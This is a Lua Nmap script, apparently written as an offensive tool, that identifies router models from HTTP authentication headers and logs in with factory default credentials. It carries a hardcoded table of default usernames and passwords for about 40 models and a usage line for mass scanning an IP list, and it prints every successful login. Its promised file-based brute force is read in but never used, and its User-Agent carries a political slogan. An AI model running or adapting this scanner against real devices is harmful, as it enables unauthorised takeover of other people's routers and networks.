-- Import required libraries
local nmap = require "nmap"
local shortport = require "shortport"
local brute = require "brute"
local stdnse = require "stdnse"
local unpwdb = require "unpwdb"
local http = require "http"

-- Define the script details
description = [[
    Script to identify router devices and brute force login using default factory credentials first, followed by credentials from a file.
    Usage:
    nmap --script nmap_router_brute.lua --script-args "userdb=path/to/usernames.txt,passdb=path/to/passwords.txt" -iL ip_list.txt
]]

author = "HackerGPT"
license = "Same as Nmap"
categories = {"brute", "auth"}

-- Define user options
portrule = shortport.port_or_service({80, 443}, {"http", "https"})

-- Factory default credentials for common router models
local default_creds = {
    -- Zyxel Models
    ["Zyxel Keenetic Omni II"] = {username="admin", password="1234"},
    ["Zyxel VMG3625-T50B"] = {username="admin", password="admin"},
    ["Zyxel VMG3925-B10B"] = {username="admin", password="admin"},

    -- TP-Link Models
    ["TP-Link Archer C7"] = {username="admin", password="admin"},
    ["TP-Link TL-WR841N"] = {username="admin", password="admin"},
    ["TP-Link Deco X60"] = {username="admin", password="admin"},
    ["TP-Link TL-WR941ND"] = {username="admin", password="admin"},

    -- D-Link Models
    ["D-Link DIR-815"] = {username="admin", password="admin"},
    ["D-Link DIR-825"] = {username="admin", password="admin"},
    ["D-Link DIR-882"] = {username="admin", password="admin"},
    ["D-Link DIR-X1560"] = {username="admin", password="admin"},

    -- Netgear Models
    ["Netgear Nighthawk R7000"] = {username="admin", password="password"},
    ["Netgear Orbi RBR50"] = {username="admin", password="admin"},
    ["Netgear Nighthawk AX12"] = {username="admin", password="password"},

    -- Huawei Models
    ["Huawei EchoLife HG8145V"] = {username="admin", password="admin"},
    ["Huawei HG8245H"] = {username="admin", password="admin"},

    -- ASUS Models
    ["ASUS RT-AC68U"] = {username="admin", password="admin"},
    ["ASUS RT-AX88U"] = {username="admin", password="admin"},

    -- MikroTik Models
    ["MikroTik hAP ac2"] = {username="admin", password=""},
    ["MikroTik RB750Gr3"] = {username="admin", password=""},

    -- Tenda Models
    ["Tenda AC6"] = {username="admin", password="admin"},
    ["Tenda AC10"] = {username="admin", password="admin"},

    -- Eltex Models
    ["Eltex RG-1402G-W"] = {username="admin", password="admin"},

    -- Netis Models
    ["Netis WF2419E"] = {username="admin", password="admin"},
    ["Netis N2"] = {username="admin", password="admin"},

    -- Linksys Models
    ["Linksys E1200"] = {username="admin", password="admin"},
    ["Linksys E2500"] = {username="admin", password="admin"},
    ["Linksys E5600"] = {username="admin", password="admin"},

    -- Ubiquiti Models
    ["Ubiquiti UniFi AP"] = {username="ubnt", password="ubnt"},
    ["Ubiquiti EdgeRouter X"] = {username="ubnt", password="ubnt"},

    -- ZTE Models
    ["ZTE ZXHN H298A"] = {username="admin", password="admin"},
    ["ZTE F660"] = {username="admin", password="admin"},

    -- Nokia Models
    ["Nokia G-240W-A"] = {username="admin", password="admin"},

    -- Belkin Models
    ["Belkin N300"] = {username="admin", password=""},
    
    -- Fortinet Models
    ["Fortinet FortiGate 60E"] = {username="admin", password="admin"},
    
    -- Synology Models
    ["Synology RT2600ac"] = {username="admin", password="admin"},

    -- Juniper Models
    ["Juniper SRX300"] = {username="netscreen", password="netscreen"}
}


-- Function to determine if the device is a router based on HTTP headers
local function is_router(host, port)
    local response, err = http.get(host, port, "/")

    -- Gracefully handle TCP errors
    if not response then
        return false, nil
    end

    if response and response.status == 401 then  -- Look for HTTP 401 Unauthorized
        -- Safely convert headers to strings before checking
        local server_header = tostring(response.header["server"] or "nil")
        local www_authenticate_header = tostring(response.header["www-authenticate"] or "nil")

        -- Check for specific router models in the WWW-Authenticate and Server headers
        for model, creds in pairs(default_creds) do
            if server_header:lower():find(model:lower()) or www_authenticate_header:lower():find(model:lower()) then
                stdnse.print_debug(1, "Identified router model: %s", model)
                return true, model
            end
        end
    end

    return false, nil
end

-- Define a brute-force driver for HTTP Basic/Digest authentication
local Driver = {
    login = function(host, port, username, password)
        -- Perform the HTTP request with Basic or Digest authentication
        local response = http.get(host, port, "/", {
            auth = {
                username = username,
                password = password,
                type = "digest"  -- or "basic", depending on the router
            },
            header = {
    			["User-Agent"] = "RUSSIA IS FASCIST"
  			}
        })

        -- Manually define success/failure status
        if response and response.status == 200 then
            return true  -- Success
        else
            return false  -- Failure
        end
    end
}

-- Brute-force authentication function
local function brute_force(host, port, router_model, user_file, pass_file)
    local attempts = 0
    local try = nmap.new_try()  -- For exception handling

    -- 1. Try default credentials first if available
    if router_model and default_creds[router_model] then
        local username = default_creds[router_model].username
        local password = default_creds[router_model].password
        print("Host: " .. tostring(host.ip) .. " - Router Model: " .. router_model )

        stdnse.print_debug(1, "Trying default credentials: %s / %s", username, password)

        local success = Driver.login(host, port, username, password)

        if success then
            stdnse.print_debug(1, "Successfully logged in using default credentials for host %s", host.ip)
            print("Host: " .. tostring(host.ip) .. " - Router Model: " .. router_model .. " - Username: " .. username .. " - Password: " .. password)
            return true
        else
            stdnse.print_debug(1, "Failed to log in with default credentials for host %s", host.ip)
        end
    end

    return false
end

-- Main action function
action = function(host, port)
    -- Get script arguments (user-provided credentials)
    local user_file = stdnse.get_script_args("userdb") or "usernames.txt"
    local pass_file = stdnse.get_script_args("passdb") or "passwords.txt"

    -- Check if the host is a router and retrieve the router model
    local is_router_device, router_model = is_router(host, port)
    if is_router_device then
        stdnse.print_debug(1, "Host %s identified as a router (%s). Starting brute force attempt.", tostring(host.ip), router_model)

        local success = brute_force(host, port, router_model, user_file, pass_file)
        if success then
            stdnse.print_debug(1, "Brute force succeeded for host %s (%s)", tostring(host.ip), router_model)
        else
            stdnse.print_debug(1, "Brute force attempt failed for host %s (%s)", tostring(host.ip), router_model)
        end
    else
        stdnse.print_debug(1, "Host %s is not identified as a router.", tostring(host.ip))
        -- Do not print anything if the host is not a router
        return nil
    end
end
